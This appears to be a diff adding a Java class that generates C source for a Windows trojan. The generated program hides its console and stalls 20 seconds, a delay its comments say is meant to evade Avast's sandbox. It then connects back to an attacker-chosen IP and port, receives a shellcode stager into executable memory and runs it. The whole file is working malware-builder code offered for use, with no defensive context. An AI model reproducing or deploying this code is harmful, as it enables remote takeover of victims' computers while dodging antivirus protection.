@@ -1,0 +1,107 @@
+package tk.clear.mermaid;
+
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+
+public class GenerateTrojan {
+    public GenerateTrojan(File trojan, String IP, String PORT){
+        try{
+            BufferedWriter writer = new BufferedWriter(new FileWriter(trojan));
+            writer.write("#define _WIN32_WINNT 0x0500\n");
+            writer.write("#include <winsock2.h>\n");
+            writer.write("#include <stdio.h>\n");
+            writer.write("#include <string.h>\n");
+            writer.write("#include <stdlib.h>\n");
+            writer.write("#include <time.h>\n");
+            writer.write("#include <windows.h>\n");
+            writer.write("\n");
+            writer.write("char* IP = \""+IP+"\";\n");
+            writer.write("int PORT = "+PORT+";\n");
+            writer.write("\n");
+            writer.write("void CloseSocketError(SOCKET recvSocket) {\n");
+            writer.write("	closesocket(recvSocket);\n");
+            writer.write("	WSACleanup();\n");
+            writer.write("	exit(1);\n");
+            writer.write("}\n");
+            writer.write("\n");
+            writer.write("main() {\n");
+            writer.write("	ShowWindow( GetConsoleWindow(), SW_HIDE );\n");
+            writer.write("\n");
+            writer.write("	// ESPERAR PARA EVITAR EL DEEPSCREEN DE AVAST\n");
+            writer.write("	int retTime = time(0) + 20;\n");
+            writer.write("	while(time(0)<retTime);\n");
+            writer.write("	// END\n");
+            writer.write("\n");
+            writer.write("	ULONG32 length;\n");
+            writer.write("	char * shellcode;\n");
+            writer.write("\n");
+            writer.write("	WORD wVersionRequested = MAKEWORD(2, 2);\n");
+            writer.write("	WSADATA wsaData;\n");
+            writer.write("	if (WSAStartup(wVersionRequested, &wsaData) < 0) {\n");
+            writer.write("		WSACleanup();\n");
+            writer.write("		exit(1);\n");
+            writer.write("	}\n");
+            writer.write("\n");
+            writer.write("	// CREAR SOCKET\n");
+            writer.write("	struct hostent * ConnectionSocket_HOST;\n");
+            writer.write("	struct sockaddr_in ConnectionSocket_PORT;\n");
+            writer.write("	SOCKET ConnectionSocket;\n");
+            writer.write("	ConnectionSocket = socket(AF_INET, SOCK_STREAM, 0);\n");
+            writer.write("	if (ConnectionSocket == INVALID_SOCKET){\n");
+            writer.write("		CloseSocketError(ConnectionSocket);\n");
+            writer.write("	}\n");
+            writer.write("	ConnectionSocket_HOST = gethostbyname(IP);\n");
+            writer.write("	if (ConnectionSocket_HOST == NULL){\n");
+            writer.write("		CloseSocketError(ConnectionSocket);\n");
+            writer.write("	}\n");
+            writer.write("	memcpy(&ConnectionSocket_PORT.sin_addr.s_addr, ConnectionSocket_HOST->h_addr, ConnectionSocket_HOST->h_length);\n");
+            writer.write("	ConnectionSocket_PORT.sin_family = AF_INET;\n");
+            writer.write("	ConnectionSocket_PORT.sin_port = htons(PORT);\n");
+            writer.write("	if ( connect(ConnectionSocket, (struct sockaddr *)&ConnectionSocket_PORT, sizeof(ConnectionSocket_PORT)) ){\n");
+            writer.write("		CloseSocketError(ConnectionSocket);\n");
+            writer.write("	}\n");
+            writer.write("	// END\n");
+            writer.write("\n");
+            writer.write("	int received = recv(ConnectionSocket, (char *)&length, 4, 0);\n");
+            writer.write("	if (received != 4 || length <= 0){\n");
+            writer.write("		CloseSocketError(ConnectionSocket);\n");
+            writer.write("	}\n");
+            writer.write("\n");
+            writer.write("	// RECIBIR STAGER\n");
+            writer.write("	shellcode = VirtualAlloc(0, length+5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n");
+            writer.write("	if (shellcode == NULL){\n");
+            writer.write("		CloseSocketError(ConnectionSocket);\n");
+            writer.write("	}\n");
+            writer.write("	shellcode[0] = 0xBF;\n");
+            writer.write("	memcpy(shellcode + 1, &ConnectionSocket, 4);\n");
+            writer.write("	// END\n");
+            writer.write("	\n");
+            writer.write("	// CONFIRMAR CONEXIÓN\n");
+            writer.write("	int lastByte=0;\n");
+            writer.write("	int currentByte=0;\n");
+            writer.write("	void * startb = shellcode + 5;\n");
+            writer.write("	while (currentByte < length) {\n");
+            writer.write("		lastByte = recv(ConnectionSocket, (char *)startb, length - currentByte, 0);\n");
+            writer.write("		startb += lastByte;\n");
+            writer.write("		currentByte += lastByte;\n");
+            writer.write("		if (lastByte == SOCKET_ERROR) {\n");
+            writer.write("			CloseSocketError(ConnectionSocket);\n");
+            writer.write("		}\n");
+            writer.write("	}\n");
+            writer.write("	// END\n");
+            writer.write("\n");
+            writer.write("	void (*LaunchShellcode)() = (void(*)())shellcode;\n");
+            writer.write("	LaunchShellcode();\n");
+            writer.write("\n");
+            writer.write("	return 0;\n");
+            writer.write("}\n");
+            writer.close();
+        } catch (IOException ex) {
+            Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
+        }
+    }
+}
